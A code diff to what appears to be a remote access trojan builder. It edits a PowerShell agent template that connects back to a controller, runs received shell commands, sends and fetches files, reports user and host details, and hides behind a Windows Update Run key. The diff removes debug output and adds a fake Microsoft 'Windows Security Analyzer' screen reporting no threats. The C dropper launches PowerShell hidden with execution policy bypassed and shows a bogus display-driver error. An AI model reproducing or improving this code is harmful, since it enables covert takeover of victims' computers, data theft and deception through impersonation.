@@ -261,81 +261,60 @@ if __name__ == "__main__":
 
 AGENT_WINDOWS_PS1_TEMPLATE = '''{CONFIG_BLOCK}
 
-$C = "Entropy"
 $KEY = $KEY.Replace('-', '+').Replace('_', '/')
 
-Write-Host "[$C] Starting agent... key length=$($KEY.Length)" -ForegroundColor Cyan
-
 function _enc($d) {
-    Write-Host "[$C] _enc: $d" -ForegroundColor DarkGray
     $r = [System.Convert]::FromBase64String($KEY)
-    Write-Host "[$C] _enc: key decoded ($($r.Length) bytes)" -ForegroundColor DarkGray
     $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
-    Write-Host "[$C] _enc: aesKey=$($ak.Length) hmacKey=$($hk.Length)" -ForegroundColor DarkGray
     $b = [System.Text.Encoding]::UTF8.GetBytes($d)
     $a = [System.Security.Cryptography.Aes]::Create()
     $a.KeySize = 128; $a.Key = $ak; $a.GenerateIV()
     $iv = $a.IV; $ct = $a.CreateEncryptor().TransformFinalBlock($b, 0, $b.Length)
     $a.Dispose()
-    Write-Host "[$C] _enc: iv=$($iv.Length) ct=$($ct.Length)" -ForegroundColor DarkGray
     $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
     $s = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
-    Write-Host "[$C] _enc: sig=$($s.Length)" -ForegroundColor DarkGray
     return [byte[]]($s + $iv + $ct)
 }
 
 function _dec($d) {
-    Write-Host "[$C] _dec: $($d.Length) bytes" -ForegroundColor DarkGray
     $r = [System.Convert]::FromBase64String($KEY)
     $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
     $s = [byte[]]$d[0..31]; $iv = [byte[]]$d[32..47]; $ct = [byte[]]$d[48..($d.Length-1)]
-    Write-Host "[$C] _dec: sig=$($s.Length) iv=$($iv.Length) ct=$($ct.Length)" -ForegroundColor DarkGray
     $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
     $ex = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
-    Write-Host "[$C] _dec: verifying HMAC..." -ForegroundColor DarkGray
-    for ($i=0; $i -lt 32; $i++) { if ($s[$i] -ne $ex[$i]) { Write-Host "[$C] _dec: HMAC MISMATCH at byte $i" -ForegroundColor Red; return $null } }
+    for ($i=0; $i -lt 32; $i++) { if ($s[$i] -ne $ex[$i]) { return $null } }
     $a = [System.Security.Cryptography.Aes]::Create()
     $a.KeySize = 128; $a.Key = $ak; $a.IV = $iv
     $pt = $a.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
     $a.Dispose()
-    $result = [System.Text.Encoding]::UTF8.GetString($pt)
-    Write-Host "[$C] _dec: OK -> $result" -ForegroundColor DarkGray
-    return $result
+    return [System.Text.Encoding]::UTF8.GetString($pt)
 }
 
 function _send($s, $d) {
-    Write-Host "[$C] _send: $d" -ForegroundColor DarkGray
     $e = _enc $d
-    Write-Host "[$C] _send: encrypted $($e.Length) bytes" -ForegroundColor DarkGray
     $h = [System.BitConverter]::GetBytes($e.Length)
     [Array]::Reverse($h)
     $s.Write($h, 0, 4); $s.Write($e, 0, $e.Length)
-    Write-Host "[$C] _send: written" -ForegroundColor DarkGray
 }
 
 function _recv($s) {
-    Write-Host "[$C] _recv: waiting for header..." -ForegroundColor DarkGray
     $h = [byte[]]::new(4); $r = 0
     while ($r -lt 4) { $n = $s.Read($h, $r, 4 - $r); if ($n -le 0) { return $null }; $r += $n }
     [Array]::Reverse($h); $l = [System.BitConverter]::ToInt32($h, 0)
-    Write-Host "[$C] _recv: expecting $l bytes" -ForegroundColor DarkGray
     $d = [byte[]]::new($l); $r = 0
     while ($r -lt $l) { $n = $s.Read($d, $r, $l - $r); if ($n -le 0) { return $null }; $r += $n }
-    Write-Host "[$C] _recv: got $($d.Length) bytes, decrypting..." -ForegroundColor DarkGray
     return _dec $d
 }
 
 function _special($s, $cmd) {
-    if ($cmd -eq "__ping__") { Write-Host "[$C] CMD: ping" -ForegroundColor Yellow; _send $s "__pong__"; return $true }
+    if ($cmd -eq "__ping__") { _send $s "__pong__"; return $true }
     if ($cmd -like "__download__|*") {
-        Write-Host "[$C] CMD: download" -ForegroundColor Yellow
         $p = $cmd.Substring(13)
         try { $b = [System.IO.File]::ReadAllBytes($p); _send $s ([System.Convert]::ToBase64String($b)) }
         catch { _send $s "__error__|$($_.Exception.Message)" }
         return $true
     }
     if ($cmd -like "__upload__|*") {
-        Write-Host "[$C] CMD: upload" -ForegroundColor Yellow
         $parts = $cmd.Split("|", 3)
         if ($parts.Length -lt 3) { _send $s "__error__|invalid format"; return $true }
         try {
@@ -348,7 +327,6 @@ function _special($s, $cmd) {
         return $true
     }
     if ($cmd -eq "__selfdestruct__") {
-        Write-Host "[$C] CMD: selfdestruct" -ForegroundColor Red
         $k = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         try { Remove-ItemProperty -Path $k -Name "WindowsUpdate" -ErrorAction SilentlyContinue } catch {}
         try { Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
@@ -356,47 +334,63 @@ function _special($s, $cmd) {
         $s.Close(); $client.Close(); exit
     }
     if ($cmd -eq "__info__") {
-        Write-Host "[$C] CMD: info" -ForegroundColor Yellow
         $i = "$([Environment]::OSVersion.Platform)|$([Environment]::OSVersion.Version.ToString())|$((Get-Location).Path)|$([Environment]::GetFolderPath('UserProfile'))|$([Environment]::UserName)|$([System.Net.Dns]::GetHostName())|$([Guid]::NewGuid().ToString())"
         _send $s $i; return $true
     }
     return $false
 }
 
+Write-Host @"
+ Windows Security Analyzer v2.1.4
+ (C) Microsoft Corporation. All rights reserved.
+ Initializing modules...
+"@ -ForegroundColor Cyan
+
+$steps = @(
+    "Loading security policies...",
+    "Checking firewall status...",
+    "Verifying system integrity...",
+    "Scanning startup entries...",
+    "Analyzing network configuration..."
+)
+foreach ($s in $steps) {
+    Write-Progress "Windows Security Analyzer" $s -PercentComplete (([array]::IndexOf($steps, $s) + 1) * 20)
+    Start-Sleep -Milliseconds 300
+}
+Write-Progress "Windows Security Analyzer" "Complete" -Completed
+
+Write-Host " No threats detected." -ForegroundColor Green
+Write-Host " System is running in optimal state." -ForegroundColor Green
+Write-Host ""
+
 while ($true) {
-    Write-Host "[$C] Connecting to $($IP):$($PORT)..." -ForegroundColor Cyan
+    Write-Host " [*] Network connectivity check..." -ForegroundColor Yellow
     try {
         $client = New-Object System.Net.Sockets.TcpClient
-        $client.ReceiveTimeout = 60000
-        $client.SendTimeout = 30000
+        $client.ReceiveTimeout = 60000; $client.SendTimeout = 30000
+        Write-Host " [*] Connecting..." -ForegroundColor DarkGray
         $client.Connect($IP, $PORT)
-        Write-Host "[$C] Connected! Getting stream..." -ForegroundColor Green
+        Write-Host " [+] Connected to update server." -ForegroundColor Green
         $s = $client.GetStream()
-        Write-Host "[$C] Sending beacon..." -ForegroundColor Green
-        _send $s "beacon"
-        Write-Host "[$C] Beacon sent, waiting for commands..." -ForegroundColor Green
-        while ($true) {
-            $cmd = _recv $s
-            if ($cmd -eq $null) {
-                Write-Host "[$C] Connection closed" -ForegroundColor Red
-                break
+        try {
+            Write-Host " [*] Sending beacon..." -ForegroundColor DarkGray
+            _send $s "beacon"
+            Write-Host " [*] Beacon sent, waiting for commands..." -ForegroundColor DarkGray
+            while ($true) {
+                $cmd = _recv $s
+                if ($cmd -eq $null) { Write-Host " [*] Connection closed by server" -ForegroundColor DarkGray; break }
+                Write-Host " [+] Command received" -ForegroundColor DarkGray
+                if (_special $s $cmd) { continue }
+                try {
+                    $out = & cmd /c $cmd 2>&1
+                    if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
+                    _send $s $out
+                } catch { _send $s "[!] $($_.Exception.Message)" }
             }
-            Write-Host "[$C] Received command: '$cmd'" -ForegroundColor Yellow
-            if (_special $s $cmd) { continue }
-            Write-Host "[$C] Executing: $cmd" -ForegroundColor Yellow
-            try {
-                $out = & cmd /c $cmd 2>&1
-                if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
-                _send $s $out
-            } catch { _send $s "[!] $($_.Exception.Message)" }
-        }
+        } catch { Write-Host " [!] Stream error: $_" -ForegroundColor Red }
         $s.Close(); $client.Close()
-        Write-Host "[$C] Disconnected, reconnecting in 30s..." -ForegroundColor Cyan
-    } catch {
-        Write-Host "[$C] ERROR: $_" -ForegroundColor Red
-        try { $s.Close() } catch {}
-        try { $client.Close() } catch {}
-    }
+    } catch { Write-Host " [!] Connection error: $_" -ForegroundColor Red }
+    Write-Host " [-] Connection lost. Retrying in 30s..." -ForegroundColor DarkYellow
     Start-Sleep -Seconds 30
 }'''
 
@@ -553,7 +547,7 @@ def compile_windows_mingw(ps1_path, output_dir="payloads", verbose=True):
         '#include <stdio.h>\n'
         '#define C "' + escaped + '"\n'
         'int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR lp,int ns){\n'
-        'char t[MAX_PATH],p[MAX_PATH],c[1024];DWORD n;\n'
+        'char t[MAX_PATH],p[MAX_PATH],c[1100];DWORD n;\n'
         'GetTempPathA(sizeof(t),t);\n'
         'snprintf(p,sizeof(p),"%se.ps1",t);\n'
         'HANDLE f=CreateFileA(p,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,'
@@ -566,6 +560,7 @@ def compile_windows_mingw(ps1_path, output_dir="payloads", verbose=True):
         'snprintf(c,sizeof(c),"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"%s\\"",p);\n'
         'CreateProcessA(NULL,c,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n'
         'CloseHandle(pi.hProcess);CloseHandle(pi.hThread);\n'
+        'MessageBoxA(NULL,"0x887A0005 - Failed to initialize graphics device.\\n\\nPlease update your display driver and restart the application.","Display Driver Error",MB_OK|MB_ICONERROR);\n'
         'return 0;\n'
         '}\n'
     )
